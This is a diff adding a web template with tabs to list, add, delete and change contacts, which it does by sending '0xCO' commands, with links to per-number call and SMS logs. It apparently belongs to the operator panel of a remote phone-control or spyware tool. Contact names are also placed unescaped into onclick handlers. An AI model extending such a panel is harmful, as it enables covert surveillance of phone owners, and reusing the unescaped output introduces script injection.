@@ -1,0 +1,243 @@
+<div class="ui segment">
+    <div class="ui top attached tabular inverted white menu" style="
+    margin-left: 0!important;
+    margin-right: 0!important;">
+    	<a class="item active" data-tab="contacts">
+	        Contacts
+	    </a>
+	    <a class="item" data-tab="addContacts">
+	        Add Contact
+	    </a>
+	    <a class="item" data-tab="delContacts">
+	        Delete Contact
+	    </a>
+	    <a class="item" data-tab="chgContacts">
+	        Change Contact
+	    </a>
+
+        <div class="right menu">
+            <button onclick="updateButton(this, '0xCO', {'action': 'getContacts'})" class="ui blue button"> <i
+                    class="icon sync"></i>Update</button>
+        </div>
+    </div>
+
+	<div class="ui bottom attached tab segment active" data-tab="contacts">
+	    <table class="ui sortable celled table">
+	        <thead>
+	            <tr>
+	                <th>Name</th>
+	                <th>Phone Number</th>
+	                <th class="no-sort" colspan="2">Logs</th>
+	            </tr>
+	        </thead>
+	        <tbody>
+	            <% pageData.forEach((contact) => {
+	            	let deleted = contact.deleted;
+	            	if(deleted)
+	            		return;
+	             %>
+	            <tr>
+	                <td><%= contact.name %></td>
+	                <td><%= contact.phoneNumber %></td>
+	                <td class="collapsing"><a href="<%= baseURL %>/calls?filter=<%= contact.phoneNumber %>">Call Log</a></td>
+	                <td class="collapsing"><a href="<%= baseURL %>/sms?filter=<%= contact.phoneNumber %>">SMS Log</a></td>
+	            </tr>
+	            <% }) %>
+	        </tbody>
+	    </table>
+	</div>
+	<!-- add Contact -->
+	<div class="ui bottom attached tab segment" data-tab="addContacts">
+    
+	    <div class="ui form">
+	        <div class="ui labeled input fluid">
+	            <div class="ui label">
+	                Name
+	            </div>
+	            <input id="name" type="text" autocomplete="off">
+	        </div>
+	        <p></p>
+	        <div class="ui labeled input fluid">
+	            <div class="ui label">
+	                Number
+	            </div>
+	            <input id="number" type="text" autocomplete="off">
+	        </div>
+	        <br>
+	        <button class="ui button fluid positive" type="submit" onclick="addContact(this)">
+	            <i class="user plus icon"></i>
+	            Add
+	        </button>
+	    </div>
+	</div>
+
+	<!-- delete Contact -->
+	<div class="ui bottom attached tab segment" data-tab="delContacts">
+	    <table class="ui sortable celled table">
+	        <thead>
+	            <tr>
+	                <th>Name</th>
+	                <th>Phone Number</th>
+	                <th class="no-sort"></th>
+	            </tr>
+	        </thead>
+	        <tbody>
+	            <% pageData.forEach((contact) => { 
+	            	let name = contact.name ;
+	            	let deleted = contact.deleted;
+	            	if(deleted)
+	            		return;
+	            	%>
+	            <tr <% if(deleted){  %> style="color: red;" <% } %> >
+	                <td><%=name%></td>
+	                <td><%= contact.phoneNumber %></td>
+	                <td class="collapsing">
+	                	<button class="ui button inverted red basic"  <% if(deleted){ %> disabled <% } %> onclick="delContact(this,<%=contact.raw_id%>,'<%=name%>')">
+	                		Delete
+	                	</button>
+	                </td>
+	            </tr>
+	            <% }) %>
+	        </tbody>
+	    </table>
+	</div>
+	
+	<!-- change Contact -->
+	<div class="ui bottom attached tab segment" data-tab="chgContacts">
+    
+	    <div class="ui form">
+	    	<div id="d_name" style="visibility: hidden;"></div>
+	    	<div id="d_phone" style="visibility: hidden;"></div>
+	        <div class="ui labeled input fluid">
+	            <div class="ui label">
+	                Name
+	            </div>
+	            <input id="name_N" type="text" autocomplete="off">
+	        </div>
+	        <p></p>
+	        <div class="ui labeled input fluid">
+	            <div class="ui label">
+	                Number
+	            </div>
+	            <input id="number_N" type="text" autocomplete="off">
+	        </div>
+	        <br>
+	        <button id="chn" class="ui button fluid positive disabled" type="submit" onclick="change(this,$('#d_name').val(),$('#d_phone').val(),$('#name_N').val(),$('#number_N').val())">
+	            Change
+	        </button>
+	    </div>
+	    <table class="ui sortable celled table">
+	        <thead>
+	            <tr>
+	                <th>Name</th>
+	                <th>Phone Number</th>
+	                <th class="no-sort"></th>
+	            </tr>
+	        </thead>
+	        <tbody>
+	            <% pageData.forEach((contact) => { 
+					let deleted = contact.deleted;
+	            	if(deleted)
+	            		return;
+	            	%>
+	            <tr>
+	                <td><%=contact.name%></td>
+	                <td><%=contact.phoneNumber %></td>
+	                <td class="collapsing">
+	                	<button class="ui button inverted green basic" onclick="chg('<%=contact.name%>','<%=contact.phoneNumber %>')">
+	                		Change this
+	                	</button>
+	                </td>
+	            </tr>
+	            <% }) %>
+	        </tbody>
+	    </table>
+	</div>
+</div>
+<script type="text/javascript"> 
+	$('.menu .item').tab();
+	$('table').tablesort();
+
+
+	function addContact(element) {
+        $(element).addClass('loading')
+        sendCommand('0xCO', {
+            'action': 'addCO',
+            'name': $('#name').val(),
+            'phone': $('#number').val()
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'Add Contact');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+        $('#name').val("");
+        $('#number').val("");
+    }
+
+    function delContact(element,raw,name) {
+        $(element).addClass('loading')
+        sendCommand('0xCO', {
+            'action': 'delCO',
+            'raw_id': raw,
+            'name': name
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'Delete Contact');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+
+    function chg(name,phone){
+    	$('#d_name').val(name);
+    	$('#d_phone').val(phone);
+    	$('#name_N').val(name);
+    	$('#number_N').val(phone);
+    	$('#chn').removeClass('disabled');
+    }
+
+    function change(element,name,phone,name_N,phone_N){
+    	$('#chn').addClass('disabled');
+
+    	$('#d_name').val("");
+    	$('#d_phone').val("");
+    	$('#name_N').val("");
+    	$('#number_N').val("");
+
+        sendCommand('0xCO', {
+            'action': 'chCO',
+            'name': name,
+            'phone': phone,
+            'name_N': name_N,
+            'phone_N': phone_N
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    if (message === 'Requested') showNotification('#2ecc71', 'Contact Changed');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+</script>
